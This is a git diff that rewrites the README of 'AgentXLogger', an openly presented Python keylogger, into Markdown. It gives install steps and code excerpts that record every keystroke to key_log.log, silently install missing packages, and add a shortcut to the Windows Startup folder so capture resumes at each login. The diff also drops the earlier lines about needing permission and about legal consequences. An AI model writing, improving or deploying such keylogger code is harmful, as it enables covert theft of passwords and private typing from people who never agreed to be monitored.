@@ -1,36 +1,65 @@
 
 
-Python agentxlogger Documentation
-Overview
-This Python keylogger captures keystrokes and logs them into a file. It is designed to run in the background and can automatically start with the operating system. The captured keystrokes are saved in a file named key_log.log.
 
-Prerequisites
-Before running the keylogger, ensure you have the following libraries installed:
 
-pynput: For capturing keyboard events.
-plyer: For displaying notifications (if desired).
-pywin32: For creating Windows shortcuts.
-If these libraries are not installed, the keylogger will attempt to install them automatically.
+## Overview
+The **AgentXLogger** is a Python-based keylogger that captures keystrokes and logs them into a file. It is designed to run in the background and can be set to automatically start with the operating system. Captured keystrokes are stored in a file named `key_log.log`.
 
-Installation
-Ensure Python is installed on your system.
-Download the script and save it as keylogger.py.
-Run the script using Python:
-bash
-Copy code
-python keylogger.py
-The script will check for required packages and install any that are missing.
+---
 
-Usage
-Once the script is running, it will capture all keyboard inputs until the "Escape" key is pressed. The logged keystrokes will be saved in key_log.log in the same directory as the script.
+## Prerequisites
+Before running AgentXLogger, ensure you have the following libraries installed:
+- **pynput**: For capturing keyboard events.
+- **plyer**: For displaying notifications (optional).
+- **pywin32**: For creating Windows shortcuts.
 
-Automatic Startup
+If these libraries are not already installed, the script will automatically attempt to install them.
+
+---
+
+## Installation
+
+1. **Install Python**:
+   - Ensure Python is installed on your system. You can download it from [python.org](https://www.python.org/downloads/).
+
+2. **Download Script**:
+   - Save the keylogger script as `keylogger.py` on your local machine.
+
+3. **Install Requirements**:
+   - Create a `requirements.txt` file with the following content:
+     ```plaintext
+     pynput
+     plyer
+     pywin32
+     ```
+   - Open your terminal or command prompt and navigate to the directory where `requirements.txt` is located. Run the following command to install the required libraries:
+     ```bash
+     pip install -r requirements.txt
+     ```
+
+4. **Run the Script**:
+   - After installing the dependencies, run the script using:
+     ```bash
+     python keylogger.py
+     ```
+   The script will check for the required packages and install any that are missing.
+
+---
+
+## Usage
+Once the script is running, it will capture all keyboard inputs until the "Escape" key is pressed. The logged keystrokes will be saved in `key_log.log` in the same directory as the script.
+
+---
+
+## Automatic Startup
 The keylogger creates a shortcut in the Windows Startup folder, ensuring it runs automatically whenever the user logs into Windows.
 
-Code Explanation
-Imports and Package Installation
-python
-Copy code
+---
+
+## Code Explanation
+
+### Imports and Package Installation
+```python
 import subprocess
 import sys
 import os
@@ -38,13 +67,14 @@ import win32com.client
 
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-subprocess: Used for executing system commands.
-sys: Provides access to system-specific parameters and functions.
-os: Used for interacting with the operating system.
-win32com.client: Used for creating Windows shortcuts.
-Library Import and Installation
-python
-Copy code
+```
+- `subprocess`: Used for executing system commands.
+- `sys`: Provides access to system-specific parameters and functions.
+- `os`: Used for interacting with the operating system.
+- `win32com.client`: Used for creating Windows shortcuts.
+
+### Library Import and Installation
+```python
 try:
     from pynput.keyboard import Key, Listener
     from plyer import notification
@@ -52,11 +82,11 @@ except ImportError:
     list1 = ['tkinter', 'pynput', 'plyer', 'pywin32']
     for i in list1:
         install(i)
+```
 This section attempts to import necessary libraries. If any library is missing, it installs them.
 
-Logging Mechanism
-python
-Copy code
+### Logging Mechanism
+```python
 log_file = "key_log.log"
 log_content = ""
 
@@ -73,19 +103,21 @@ def on_press(key):
 
     with open(log_file, "w") as f: 
         f.write(log_content)
-log_file: Specifies the name of the log file.
-log_content: A string that holds the recorded keystrokes.
-on_press: A callback function triggered when a key is pressed. It appends the pressed key to log_content and writes it to log_file.
-Key Release Handling
-python
-Copy code
+```
+- `log_file`: Specifies the name of the log file.
+- `log_content`: A string that holds the recorded keystrokes.
+- `on_press`: A callback function triggered when a key is pressed. It appends the pressed key to `log_content` and writes it to `log_file`.
+
+### Key Release Handling
+```python
 def on_release(key):
     if key == Key.esc:
         return False
-on_release: A callback function triggered when a key is released. If the "Escape" key is pressed, it stops the listener.
-Creating a Startup Shortcut
-python
-Copy code
+```
+- `on_release`: A callback function triggered when a key is released. If the "Escape" key is pressed, it stops the listener.
+
+### Creating a Startup Shortcut
+```python
 def create_startup_shortcut():
     keylogger_path = os.path.join(os.path.dirname(sys.executable), "dist", "keylogger.exe")
 
@@ -98,14 +130,16 @@ def create_startup_shortcut():
     shortcut.save()
 
 create_startup_shortcut()
-create_startup_shortcut: Creates a Windows shortcut to ensure the keylogger runs at startup.
-Main Listener
-python
-Copy code
+```
+- `create_startup_shortcut`: Creates a Windows shortcut to ensure the keylogger runs at startup.
+
+### Main Listener
+```python
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
-Listener: A context manager that listens for keyboard events. It calls on_press and on_release as keys are pressed and released, respectively.
-Important Notes
-Ensure that you have permission to run a keylogger on the system.
-Misuse of this software can lead to legal consequences. Use it responsibly and ethically.
+```
+- `Listener`: A context manager that listens for keyboard events. It calls `on_press` and `on_release` as keys are pressed and released, respectively.
 
+---
+
+ 
